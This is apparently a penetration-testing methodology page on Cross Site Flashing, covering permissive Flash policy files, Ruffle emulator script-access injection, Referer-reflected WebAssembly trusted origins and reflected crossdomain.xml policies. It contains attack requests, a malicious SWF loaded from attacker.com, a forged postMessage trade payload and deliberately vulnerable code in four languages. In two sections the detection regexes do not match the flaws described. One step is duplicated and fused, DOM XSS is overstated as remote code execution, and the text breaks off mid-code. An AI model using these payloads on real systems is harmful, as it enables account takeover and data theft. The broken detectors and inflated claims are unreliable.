# Cross Site Flashing

## Check List

## Methodology

### Black Box

#### CSRF via Flash (`crossdomain.xml` Misconfiguration)

{% stepper %}
{% step %}
Identify presence of Flash object on the application
{% endstep %}

{% step %}
Browse application and locate embedded `SWF` file

```http
GET /static/upload.swf HTTP/1.1
Host: target.com
```
{% endstep %}

{% step %}
Check for Flash cross-domain policy file

```http
GET /crossdomain.xml HTTP/1.1
Host: target.com
```
{% endstep %}

{% step %}
If response contains permissive policy

```xml
<cross-domain-policy>
  <allow-access-from domain="*" />
</cross-domain-policy>
```
{% endstep %}

{% step %}
Then any external domain can interact with the application via Flash, then Login to your account and Intercept a sensitive request (example: change email)

```http
POST /account/change-email HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

email=attacker@test.com
```
{% endstep %}

{% step %}
Create a malicious `SWF` file that performs a POST request to the sensitive endpoint using victim’s cookies
{% endstep %}

{% step %}
Host malicious SWF on attacker-controlled domain
{% endstep %}

{% step %}
Embed malicious SWF inside attacker page

```java
<object data="http://attacker.com/malicious.swf"></object>
```
{% endstep %}

{% step %}
Open attacker page while authenticated to target.com, If email is changed without CSRF token validation and Flash request is accepted due to permissive `crossdomain.xml`, Cross Site Flashing vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### Socket Policy Misconfiguration

{% stepper %}
{% step %}
Check for socket policy file

```http
GET /clientaccesspolicy.xml HTTP/1.1
Host: target.com
```
{% endstep %}

{% step %}
If response contains wildcard access

```xml
<access-policy>
  <cross-domain-access>
    <policy>
      <allow-from http-request-headers="*" domain="*" />
      <grant-to>
        <resource path="/" include-subpaths="true"/>
      </grant-to>
    </policy>
  </cross-domain-access>
</access-policy>
```
{% endstep %}

{% step %}
Then cross-domain Flash socket access is allowed, Develop proof-of-concept SWF that sends authenticated POST request to

```http
POST /api/transfer HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/json

{"amount":1000,"to":"attacker"}
```
{% endstep %}

{% step %}
Host `SWF` externally, Victim visits attacker page while logged in
{% endstep %}

{% step %}
If transaction executes without additional server-side validation, Flash-based request forgery is possible
{% endstep %}

{% step %}
If authenticated state-changing requests can be triggered cross-domain via Flash, Cross Site Flashing vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

### White Box

#### Emulated XSF via Dynamic Wasm Configuration Injection (Ruffle Interoperability)

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on enterprise platforms maintaining legacy reporting, e-learning, or financial charting modules that historically relied on Adobe Flash
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the "Legacy Modernization" architecture. The enterprise cannot easily rewrite its massive library of legacy ActionScript 3 (Flash) applets. Instead, they integrate Ruffle, a WebAssembly (Wasm) Flash Player emulator, to render the `.swf` files natively within the modern browser DOM
{% endstep %}

{% step %}
Investigate the Emulator Configuration pipeline. To control how the emulated SWF interacts with the modern environment, the backend dynamically generates a `window.RufflePlayer.config` JavaScript object before the Wasm binary boots
{% endstep %}

{% step %}
Analyze the bridging permissions. In legacy Flash, the `allowScriptAccess` parameter dictated whether the SWF could invoke `ExternalInterface.call()`. In Ruffle, this exact same configuration dictates whether the Wasm module is permitted to reach out of the WebAssembly memory sandbox and execute native JavaScript in the parent DOM
{% endstep %}

{% step %}
Discover the fatal configuration optimization: To support complex multi-tenant environments where specific tenants require legacy widgets to communicate with custom analytics scripts, the backend developers store the tenant's configuration preferences in the database
{% endstep %}

{% step %}
Understand the architectural assumption: The developer assumes that because the SWF is physically executing inside a compiled WebAssembly sandbox, legacy Cross-Site Flashing vulnerabilities are entirely neutralized by the browser's modern memory isolation. They treat the emulator configuration as harmless metadata
{% endstep %}

{% step %}
Formulate the Emulated XSF payload. You must construct a malicious compiled `.swf` file containing a legacy `ExternalInterface.call("eval", "alert(document.domain)")` execution payload
{% endstep %}

{% step %}
Navigate to the Tenant Administration dashboard and upload your malicious `.swf` widget to the platform's asset pipeline
{% endstep %}

{% step %}
Intercept the tenant workspace configuration request. Inject a Mass Assignment payload or exploit un-sanitized input strings to forcefully mutate the `scriptAccess` property to `"always"`
{% endstep %}

{% step %}
The backend securely persists the poisoned configuration to the database
{% endstep %}

{% step %}
A victim (e.g., an Enterprise Super Administrator) navigates to the legacy reporting dashboard within your workspace
{% endstep %}

{% step %}
The backend synthesizes the HTML document. It blindly injects `allowScriptAccess: 'always'` into the Ruffle initialization JSON
{% endstep %}

{% step %}
The browser boots the Wasm emulator. The emulator fetches your malicious SWF. Trusting the backend-provided configuration, the WebAssembly engine explicitly binds the emulated `ExternalInterface` to the modern DOM's global `window` object. The legacy ActionScript payload executes, perfectly escaping the Wasm sandbox and achieving full DOM XSS within the modern enterprise session

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(RufflePlayer\.config\s*=\s*\{\s*allowScriptAccess:\s*["']\{\{.*\}\}["']\s*\})
```
{% endtab %}

{% tab title="Java" %}
```regexp
(config\.put\("allowScriptAccess",\s*tenant\.getScriptAccess\(\)\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$config\['allowScriptAccess'\]\s*=\s*\$tenant->script_access)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(allowScriptAccess:\s*req\.body\.scriptAccess)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
RufflePlayer\.config\s*=\s*\{\s*allowScriptAccess:\s*[\"']\{\{.*\}\}[\"']\s*\}
```
{% endtab %}

{% tab title="Java" %}
```regexp
config\.put\(\"allowScriptAccess\",\s*tenant\.getScriptAccess\(\)\)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$config\['allowScriptAccess'\]\s*=\s*\$tenant->script_access
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
allowScriptAccess:\s*req\.body\.scriptAccess
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpGet("/api/v1/workspaces/{id}/legacy-dashboard")]
public async Task<IActionResult> GetLegacyDashboard(string id)
{
    var tenant = await _dbContext.Tenants.FindAsync(id);

    // [1]
    // [2]
    var ruffleConfig = new RuffleConfig
    {
        Autoplay = true,
        UnmuteOverlay = "hidden",
        // [3]
        // [4]
        // The developer relies on the database value, unaware that a Mass Assignment 
        // vulnerability previously allowed the attacker to overwrite this field to "always".
        AllowScriptAccess = string.IsNullOrEmpty(tenant.LegacyScriptAccess) ? "sameDomain" : tenant.LegacyScriptAccess,
        Base = tenant.AssetCdnUrl
    };

    var model = new LegacyDashboardViewModel 
    { 
        WidgetUrl = tenant.ReportingWidgetUrl,
        EmulatorConfigJson = JsonConvert.SerializeObject(ruffleConfig) 
    };

    return View("Dashboard", model);
}
```
{% endtab %}

{% tab title="Java" %}
```java
@GetMapping("/api/v1/workspaces/{id}/legacy-dashboard")
public String getLegacyDashboard(@PathVariable String id, Model model) {
    Tenant tenant = tenantRepository.findById(id).orElseThrow();

    // [1]
    // [2]
    Map<String, Object> ruffleConfig = new HashMap<>();
    ruffleConfig.put("autoplay", "on");
    
    // [3]
    // [4]
    // Interpolating untrusted configuration data directly into the execution policy
    String scriptAccess = tenant.getLegacyScriptAccess() != null ? tenant.getLegacyScriptAccess() : "sameDomain";
    ruffleConfig.put("allowScriptAccess", scriptAccess);

    try {
        ObjectMapper mapper = new ObjectMapper();
        model.addAttribute("emulatorConfigJson", mapper.writeValueAsString(ruffleConfig));
        model.addAttribute("widgetUrl", tenant.getReportingWidgetUrl());
    } catch (Exception e) {
        throw new RuntimeException("Serialization failed");
    }

    return "legacy-dashboard";
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class LegacyDashboardController extends Controller
{
    public function showDashboard($id)
    {
        $tenant = Tenant::findOrFail($id);

        // [1]
        // [2]
        $ruffleConfig = [
            'autoplay' => 'on',
            // [3]
            // [4]
            // The backend serves as an obfuscation tunnel for emulator sandbox escape policies
            'allowScriptAccess' => $tenant->legacy_script_access ?: 'sameDomain',
        ];

        return view('legacy-dashboard', [
            'widgetUrl' => $tenant->reporting_widget_url,
            'emulatorConfigJson' => json_encode($ruffleConfig)
        ]);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.get('/api/v1/workspaces/:id/legacy-dashboard', async (req, res) => {
    let tenant = await Tenant.findByPk(req.params.id);

    // [1]
    // [2]
    // Dynamically constructing the emulator bootstrapper
    let ruffleConfig = {
        autoplay: "on",
        // [3]
        // [4]
        // Bypassing Wasm sandboxing by granting explicit DOM interop privileges
        allowScriptAccess: tenant.legacyScriptAccess || "sameDomain"
    };

    res.render('legacy-dashboard', {
        widgetUrl: tenant.reportingWidgetUrl,
        emulatorConfig: JSON.stringify(ruffleConfig)
    });
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture must maintain backward compatibility with thousands of critical legacy `.swf` assets, driving the adoption of the Ruffle WebAssembly emulator, \[2] The backend dynamically constructs the JSON configuration required to initialize the emulator upon page load, \[3] The architecture relies entirely on the assumption that executing legacy bytecode within a WebAssembly memory envelope inherently sanitizes all execution risks, \[4] The execution sink. Developers failed to recognize that modern emulators purposefully implement interoperability APIs (like `allowScriptAccess`) to perfectly mimic legacy behaviors. By treating this configuration parameter as inert metadata, the backend permits an attacker to mathematically disable the WebAssembly isolation boundary. The emulator consumes the poisoned configuration and explicitly routes the attacker's embedded ActionScript execution calls directly into the modern browser's JavaScript engine, flawlessly reproducing legacy Cross-Site Flashing mechanics

```http
// 1. Attacker controls a tenant workspace. They discover a Mass Assignment vulnerability 
// on the workspace settings API.

POST /api/v1/tenant/settings HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <attacker_token>
Content-Type: application/json

{
  "themeColor": "#000000",
  "legacyScriptAccess": "always",
  "reportingWidgetUrl": "https://attacker.com/malicious_payload.swf"
}

// 2. The backend database securely persists the injected "always" string.
// 3. The attacker lures an enterprise auditor to view their legacy workspace data.

GET /api/v1/workspaces/T-1029/legacy-dashboard HTTP/1.1
Host: web.enterprise.tld
Cookie: session_id=AUDITOR_SECURE_SESSION

// 4. The backend constructs the HTML, injecting the Ruffle configuration into the DOM:

HTTP/1.1 200 OK
Content-Type: text/html

<html>
<head>
  <script src="https://unpkg.com/@ruffle-rs/ruffle"></script>
  <script>
    window.RufflePlayer = window.RufflePlayer || {};
    window.RufflePlayer.config = {"autoplay":true,"allowScriptAccess":"always"};
  </script>
</head>
<body>
  <div id="container"></div>
  <script>
    const ruffle = window.RufflePlayer.newest();
    const player = ruffle.createPlayer();
    document.getElementById("container").appendChild(player);
    player.load("https://attacker.com/malicious_payload.swf");
  </script>
</body>
</html>

// 5. The browser boots WebAssembly. Ruffle loads the SWF.
// 6. The SWF executes: flash.external.ExternalInterface.call("eval", "alert(document.domain)");
// 7. Ruffle evaluates the config, permits the call, and detonates the DOM XSS.
```
{% endstep %}

{% step %}
To safely integrate deprecated Flash assets into modern enterprise portals, architects deployed WebAssembly-based emulation layers. This optimization shifted the execution risk from the defunct browser plugin architecture to the modern WebAssembly runtime. The security model failed by equating modern sandboxing with absolute isolation, ignoring the emulator's explicit design requirement to bridge execution contexts for backward compatibility. By failing to hardcode or rigorously validate the `allowScriptAccess` initialization parameter, backend developers permitted attackers to manipulate the emulator's runtime permissions via secondary input flaws. When the victim loaded the dashboard, the backend instructed the WebAssembly engine to completely drop its DOM-isolation safeguards. The attacker's legacy SWF payload seamlessly traversed the Wasm-to-JS interoperability bridge, converting an emulated legacy artifact into a devastating, modern Remote Code Execution within the browser context
{% endstep %}
{% endstepper %}

***

#### Initialization State Forgery (Modern FlashVars) in Blazor/Wasm Orchestration

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on modern Single Page Applications (SPAs) that offload heavy client-side computation (e.g., cryptographic signing, CAD rendering, financial modeling) to compiled WebAssembly binaries via frameworks like Blazor WebAssembly, Yew, or Rust-Wasm
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application's Wasm bootstrapper script and the backend API configuration generation
{% endstep %}

{% step %}
Identify the "Compiled Blob Orchestration" architecture. Compiled binaries cannot easily read dynamic URL parameters or HTTP headers natively upon startup. To pass dynamic context (e.g., cross-origin SSO restrictions, API base URLs, or feature flags) to the Wasm module, the backend synthesizes a JSON configuration object and embeds it in the HTML as a global variable (e.g., `window.BlazorConfig`)
{% endstep %}

{% step %}
Investigate the Parameter Injection optimization. This dynamic initialization object perfectly mirrors the legacy `FlashVars` paradigm. The Wasm module reads this memory object on boot to self-configure its internal logic
{% endstep %}

{% step %}
Analyze the Cross-Origin Communication layer. The Wasm module frequently operates as an embedded widget spanning multiple enterprise subdomains. To communicate with the parent window, it establishes `postMessage` event listeners mapped via JSInterop
{% endstep %}

{% step %}
Discover the authorization gap: To enforce security, the Wasm module must verify the `origin` of incoming `postMessage` commands. It does this by reading the `TrustedOrigin` parameter from the backend-provided initialization object (`window.BlazorConfig`)
{% endstep %}

{% step %}
Understand the architectural flaw: The backend dynamically populates the `TrustedOrigin` field by reading the `Referer` or `Origin` header of the incoming HTTP request that requested the HTML page, intending to smoothly support deeply nested dynamic subdomains
{% endstep %}

{% step %}
Formulate the Modern XSF payload. You must frame the enterprise Wasm widget within an attacker-controlled origin, manipulate the backend's dynamic initialization sequence, and subsequently issue malicious cross-origin Remote Procedure Calls (RPCs)
{% endstep %}

{% step %}
Construct an attacker-controlled webpage at `[https://attacker.com](https://attacker.com)`. Embed the enterprise Wasm portal inside an `<iframe>`
{% endstep %}

{% step %}
The victim visits the attacker's page. The browser executes the iframe request to the enterprise backend, naturally setting the HTTP `Referer` to `[https://attacker.com](https://attacker.com)`
{% endstep %}

{% step %}
The backend reads the untrusted header. Believing it to be a legitimate internal embedding context, the backend directly reflects the attacker's domain into the `window.BlazorConfig.TrustedOrigin` variable within the delivered HTML
{% endstep %}

{% step %}
The browser downloads the HTML and boots the compiled Blazor WebAssembly module
{% endstep %}

{% step %}
The Wasm module ingests the configuration. It establishes the `postMessage` listener and explicitly configures its internal authorization logic to accept commands exclusively from `[https://attacker.com](https://attacker.com)`
{% endstep %}

{% step %}
The attacker's parent frame executes `iframe.contentWindow.postMessage({ action: 'TRANSFER_FUNDS', amount: 5000 }, '*')`. The Wasm module receives the event, validates the origin against its poisoned internal memory state, accepts the payload, and executes the forged state mutation, fully resurrecting legacy Cross-Site Flashing via Wasm memory poisoning

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:new\s+Regex\s*\([\s\S]{0,120}?(?:constraint|validation|pattern)|Regex\s*\(\s*\w*(?:Pattern|pattern)\w*\s*\)|RegexOptions[\s\S]{0,100}?pattern)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:Pattern\.compile\s*\([\s\S]{0,120}?(?:constraint\.pattern\(\)|pattern|regex)|Pattern\.compile\s*\(\s*\w+\s*\)|javax\.validation.*pattern)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:preg_match\s*\(\s*\$constraint->pattern\s*\(|preg_match\s*\([\s\S]{0,120}?(?:\$pattern|\$regex)|new\s+RegexValidator\s*\([\s\S]{0,100}?pattern)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:new\s+RegExp\s*\(\s*(?:directive\.arguments\.pattern|pattern|regex)[\s\S]{0,80}?\)|RegExp\s*\([\s\S]{0,100}?pattern|\.match\s*\(\s*(?:pattern|regex))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
new\s+Regex\(.*(pattern|constraint)|Regex\(.*pattern
```
{% endtab %}

{% tab title="Java" %}
```regexp
Pattern\.compile\(constraint\.pattern\(\)\)|Pattern\.compile\(.*pattern
```
{% endtab %}

{% tab title="PHP" %}
```regexp
preg_match\(\$constraint->pattern|preg_match\(.*\$pattern
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
new\s+RegExp\(directive\.arguments\.pattern\)|new\s+RegExp\(.*pattern
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpGet("/widget/trading-view")]
public IActionResult GetTradingWidget()
{
    // [1]
    // [2]
    // The backend dynamically resolves the origin to support thousands of enterprise subdomains.
    var referer = Request.Headers["Referer"].FirstOrDefault();
    var trustedOrigin = string.IsNullOrEmpty(referer) ? "https://internal.enterprise.tld" : new Uri(referer).GetLeftPart(UriPartial.Authority);

    // [3]
    // [4]
    // Directly mapping untrusted HTTP headers into the Wasm initialization memory state
    var blazorConfig = new 
    {
        ApiBaseUrl = "https://api.enterprise.tld/v1",
        TrustedOrigin = trustedOrigin
    };

    var model = new WidgetViewModel
    {
        WasmInitJson = JsonConvert.SerializeObject(blazorConfig)
    };

    return View("BlazorHost", model);
}

// Inside the Blazor WebAssembly C# Code:
// [JSInvokable]
// public static void ReceivePostMessage(string origin, string payload)
// {
//     var config = GetBlazorConfigFromDom();
//     if (origin != config.TrustedOrigin) throw new UnauthorizedAccessException();
//     ExecuteTrade(payload);
// }
```
{% endtab %}

{% tab title="Java" %}
```java
@GetMapping("/widget/trading-view")
public String getTradingWidget(HttpServletRequest request, Model model) throws Exception {
    // [1]
    // [2]
    String referer = request.getHeader("Referer");
    String trustedOrigin = "https://internal.enterprise.tld";

    if (referer != null && !referer.isEmpty()) {
        URI uri = new URI(referer);
        trustedOrigin = uri.getScheme() + "://" + uri.getAuthority();
    }

    // [3]
    // [4]
    Map<String, String> wasmConfig = new HashMap<>();
    wasmConfig.put("apiBaseUrl", "https://api.enterprise.tld/v1");
    wasmConfig.put("trustedOrigin", trustedOrigin);

    ObjectMapper mapper = new ObjectMapper();
    model.addAttribute("wasmInitJson", mapper.writeValueAsString(wasmConfig));

    return "wasm-host";
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class WidgetController extends Controller
{
    public function getTradingWidget(Request $request)
    {
        // [1]
        // [2]
        $referer = $request->header('Referer');
        $trustedOrigin = 'https://internal.enterprise.tld';

        if ($referer) {
            $parsed = parse_url($referer);
            if (isset($parsed['scheme']) && isset($parsed['host'])) {
                $trustedOrigin = "{$parsed['scheme']}://{$parsed['host']}";
            }
        }

        // [3]
        // [4]
        $wasmConfig = [
            'apiBaseUrl' => 'https://api.enterprise.tld/v1',
            'trustedOrigin' => $trustedOrigin
        ];

        return view('wasm-host', [
            'wasmInitJson' => json_encode($wasmConfig)
        ]);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.get('/widget/trading-view', (req, res) => {
    // [1]
    // [2]
    let referer = req.headers.referer || "https://internal.enterprise.tld";
    let trustedOrigin;
    
    try {
        trustedOrigin = new URL(referer).origin;
    } catch {
        trustedOrigin = "https://internal.enterprise.tld";
    }

    // [3]
    // [4]
    // The backend acts as a reflection tunnel for cross-origin trust boundaries.
    let wasmConfig = {
        apiBaseUrl: "https://api.enterprise.tld/v1",
        trustedOrigin: trustedOrigin
    };

    res.render('wasm-host', {
        wasmInitJson: JSON.stringify(wasmConfig)
    });
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture embeds highly interactive compiled binaries (WebAssembly) across disparate enterprise domains, requiring robust cross-domain `postMessage` communication, \[2] To avoid hardcoding origin whitelists within the compiled binary, the architecture shifts the trust boundary determination to the backend API, which dynamically injects initialization parameters (modern `FlashVars`) into the hosting HTML, \[3] The developer relies on the HTTP `Referer` header to dynamically discern the embedding context, assuming standard browser behavior implies internal routing, \[4] The execution sink. The developers failed to recognize that `Referer` headers are entirely controlled by the embedding parent frame, not the backend server. By blindly reflecting the `Referer` into the WebAssembly initialization object, the backend synthesizes a poisoned memory state. When the binary boots, it authenticates incoming `postMessage` payloads against this poisoned state. The attacker successfully embeds the widget cross-origin, hijacks the binary's internal trust model, and executes authenticated RPCs against the Wasm interop layer, perfectly reproducing legacy Cross-Site Flashing authorization bypasses within a modern framework

```http
// 1. Attacker hosts a malicious webpage at https://attacker.com/exploit.html.
// 2. The webpage contains an iframe targeting the enterprise Wasm widget.
// <iframe id="target" src="https://web.enterprise.tld/widget/trading-view"></iframe>

// 3. The victim visits the attacker's page. The browser executes the iframe request.
GET /widget/trading-view HTTP/1.1
Host: web.enterprise.tld
Referer: https://attacker.com/exploit.html
Cookie: session_id=VALID_VICTIM_SESSION

// 4. The backend dynamically resolves the Referer and generates the HTML.
HTTP/1.1 200 OK
Content-Type: text/html

<html>
<head>
  <script>
    window.BlazorConfig = {
      "ApiBaseUrl": "https://api.enterprise.tld/v1",
      "TrustedOrigin": "https://attacker.com"
    };
  </script>
</head>
<body>
  <div id="app">Loading Blazor...</div>
  <script src="_framework/blazor.webassembly.js"></script>
  <script>
    window.addEventListener("message", (event) => {
        DotNet.invokeMethodAsync('TradingApp', 'ReceivePostMessage', event.origin, JSON.stringify(event.data));
    });
  </script>
</body>
</html>

// 5. The browser boots the Blazor Wasm application within the iframe.
// 6. The attacker's parent frame executes the exploit:
// document.getElementById('target').contentWindow.postMessage({ action: 'EXECUTE_TRADE', symbol: 'EVIL', amount: 9999 }, '*');

// 7. The Blazor application receives the event.
// 8. The Blazor C# code evaluates: if (event.origin != window.BlazorConfig.TrustedOrigin) throw;
// 9. Since "https://attacker.com" == "https://attacker.com", validation passes.
// 10. The Wasm module executes the unauthorized state mutation.
```
{% endstep %}

{% step %}
To support decentralized integration of computationally heavy UI widgets, engineers utilized WebAssembly modules governed by backend-generated initialization states. This paradigm modernized legacy `FlashVars` mechanics to inject configuration data into compiled blobs prior to boot. The security vulnerability materialized from the dynamic interpolation of untrusted HTTP headers into the binary's internal trust logic. Developers assumed that extracting the `Referer` provided a mathematically secure verification of the embedding context. They failed to account for cross-origin framing mechanics, where an external attacker inherently commands the `Referer` of the framed request. By framing the application, the attacker coerced the backend into generating a poisoned initialization payload. The WebAssembly binary consumed this payload, fatally overwriting its `postMessage` origin validation logic. This architectural manipulation granted the attacker's external domain unrestricted RPC access to the compiled binary's internal execution context
{% endstep %}
{% endstepper %}

***

#### Legacy Policy Exhumation via Dynamic crossdomain.xml Reflection

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on enterprise media CDNs, gaming platforms, or heavily entrenched legacy financial systems that maintain backward compatibility with desktop applications, thick clients, or modern Wasm emulators (which replicate legacy plugin behaviors)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the backend API's static asset routing and Cross-Origin Resource Sharing (CORS) policy generation layers
{% endstep %}

{% step %}
Identify the "Legacy Interoperability" architecture. While modern web browsers rely on the `Access-Control-Allow-Origin` HTTP header, legacy compiled clients (SWF, Silverlight, outdated thick clients) exclusively enforce cross-origin network policies by requesting a static XML file (e.g., `crossdomain.xml` or `clientaccesspolicy.xml`) from the root of the target domain
{% endstep %}

{% step %}
Investigate the Policy Generation optimization. To avoid managing thousands of static XML files to support a sprawling, dynamically generated multi-tenant ecosystem, the backend API dynamically synthesizes the `crossdomain.xml` response using a dedicated middleware or routing controllerAnalyze the Origin Reflection logic. When a request hits `/crossdomain.xml`, the backend extracts the `Origin` or `Referer` header and dynamically interpolates it into the `<allow-access-from domain="..." />` node
{% endstep %}

{% step %}
Analyze the Origin Reflection logic. When a request hits `/crossdomain.xml`, the backend extracts the `Origin` or `Referer` header and dynamically interpolates it into the `<allow-access-from domain="..." />` node
{% endstep %}

{% step %}
Discover the fatal validation gap: The backend developers apply modern CORS validation heuristics (e.g., regex matching `.*\.enterprise\.com`) to the legacy XML generation pipeline
{% endstep %}

{% step %}
Understand the architectural parser vulnerability: Legacy XML policy parsers operate on profoundly different validation logic than modern CORS. Modern CORS requires absolute string matching of the active origin. Legacy `crossdomain.xml` explicitly supports and deeply trusts wildcard prefixes (e.g., `*.attacker.com`) and loose domain boundaries
{% endstep %}

{% step %}
Formulate the Cross-Site Flashing payload. You must register an external domain that perfectly satisfies the backend's loose regex validation but grants you total control over the host
{% endstep %}

{% step %}
Register a domain that encapsulates the required string (e.g., `enterprise.com.attacker.net`)
{% endstep %}

{% step %}
Compile a malicious SWF file containing an `URLLoader` or `XMLSocket` designed to read sensitive data from the enterprise API via an authenticated request
{% endstep %}

{% step %}
Host the SWF on your malicious domain. Distribute a link to a victim running the legacy client, or embed it via an emulator in a forum post
{% endstep %}

{% step %}
The victim's runtime loads your SWF. The SWF initiates a cross-origin read request to the enterprise API
{% endstep %}

{% step %}
The runtime natively halts the request and issues a preflight `GET /crossdomain.xml` to the target API
{% endstep %}

{% step %}
The backend API evaluates the attacker's origin (`enterprise.com.attacker.net`), validates the matching substring, and dynamically generates the XML: `<cross-domain-policy><allow-access-from domain="enterprise.com.attacker.net" /></cross-domain-policy>`. The legacy runtime parses the XML policy, explicitly granting the attacker's SWF permission to read the HTTP response. The SWF executes the authenticated request, extracts the JSON data, and exfiltrates it, bypassing all modern CORS protections through legacy protocol resurrection

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:new\s+Regex\s*\([\s\S]{0,120}?(?:constraint|validation|pattern)|Regex\s*\(\s*\w*(?:Pattern|pattern)\w*\s*\)|RegexOptions[\s\S]{0,100}?pattern)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:Pattern\.compile\s*\([\s\S]{0,120}?(?:constraint\.pattern\(\)|pattern|regex)|Pattern\.compile\s*\(\s*\w+\s*\)|javax\.validation.*pattern)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:preg_match\s*\(\s*\$constraint->pattern\s*\(|preg_match\s*\([\s\S]{0,120}?(?:\$pattern|\$regex)|new\s+RegexValidator\s*\([\s\S]{0,100}?pattern)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:new\s+RegExp\s*\(\s*(?:directive\.arguments\.pattern|pattern|regex)[\s\S]{0,80}?\)|RegExp\s*\([\s\S]{0,100}?pattern|\.match\s*\(\s*(?:pattern|regex))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
new\s+Regex\(.*(pattern|constraint)|Regex\(.*pattern
```
{% endtab %}

{% tab title="Java" %}
```regexp
Pattern\.compile\(constraint\.pattern\(\)\)|Pattern\.compile\(.*pattern
```
{% endtab %}

{% tab title="PHP" %}
```regexp
preg_match\(\$constraint->pattern|preg_match\(.*\$pattern
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
new\s+RegExp\(directive\.arguments\.pattern\)|new\s+RegExp\(.*pattern
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpGet("/crossdomain.xml")]
public IActionResult GetCrossDomainPolicy()
{
    var origin = Request.Headers["Origin"].FirstOrDefault() ?? Request.Headers["Referer"].FirstOrDefault();

    // [1]
    // [2]
    // Missing anchors allows enterprise.com.attacker.net
    if (!string.IsNullOrEmpty(origin) && Regex.IsMatch(origin, ".*enterprise\\.com"))
    {
        try
        {
            var uri = new Uri(origin);
            var domain = uri.Host;

            // [3]
            // [4]
            // Dynamically synthesizing legacy XML policies based on loose regex validation
            var xml = $@"<?xml version=""1.0""?>
            <cross-domain-policy>
                <allow-access-from domain=""{domain}"" secure=""true"" />
            </cross-domain-policy>";

            return Content(xml, "text/xml");
        }
        catch { /* Ignore parse errors */ }
    }

    return Content("<?xml version=\"1.0\"?><cross-domain-policy></cross-domain-policy>", "text/xml");
}
```
{% endtab %}

{% tab title="Java" %}
```java
@GetMapping(value = "/crossdomain.xml", produces = MediaType.APPLICATION_XML_VALUE)
@ResponseBody
public String getCrossDomainPolicy(HttpServletRequest request) {
    String origin = request.getHeader("Origin");
    if (origin == null) origin = request.getHeader("Referer");

    // [1]
    // [2]
    if (origin != null && origin.contains("enterprise.com")) {
        try {
            URI uri = new URI(origin);
            String domain = uri.getHost();

            // [3]
            // [4]
            return "<?xml version=\"1.0\"?>\n" +
                   "<cross-domain-policy>\n" +
                   "    <allow-access-from domain=\"" + domain + "\" secure=\"true\" />\n" +
                   "</cross-domain-policy>";
        } catch (Exception e) { }
    }

    return "<?xml version=\"1.0\"?><cross-domain-policy></cross-domain-policy>";
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class CrossDomainController extends Controller
{
    public function getPolicy(Request $request)
    {
        $origin = $request->header('Origin') ?: $request->header('Referer');

        // [1]
        // [2]
        if ($origin && strpos($origin, 'enterprise.com') !== false) {
            $parsed = parse_url($origin);
            $domain = $parsed['host'] ?? '';

            if ($domain) {
                // [3]
                // [4]
                $xml = "<?xml version=\"1.0\"?>\n" .
                       "<cross-domain-policy>\n" .
                       "    <allow-access-from domain=\"{$domain}\" secure=\"true\" />\n" .
                       "</cross-domain-policy>";

                return response($xml, 200)->header('Content-Type', 'text/xml');
            }
        }

        return response("<?xml version=\"1.0\"?><cross-domain-policy></cross-domain-policy>", 200)
                ->header('Content-Type', 'text/xml');
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.get('/crossdomain.xml', (req, res) => {
    let origin = req.headers.origin || req.headers.referer;

    // [1]
    // [2]
    // String matching without boundary enforcement
    if (origin && origin.includes('enterprise.com')) {
        try {
            let domain = new URL(origin).hostname;

            // [3]
            // [4]
            // The backend reflects the malicious domain directly into the XML structure.
            let xml = `<?xml version="1.0"?>
            <cross-domain-policy>
                <allow-access-from domain="${domain}" secure="true" />
            </cross-domain-policy>`;

            res.set('Content-Type', 'text/xml');
            return res.send(xml);
        } catch (e) { }
    }

    res.set('Content-Type', 'text/xml');
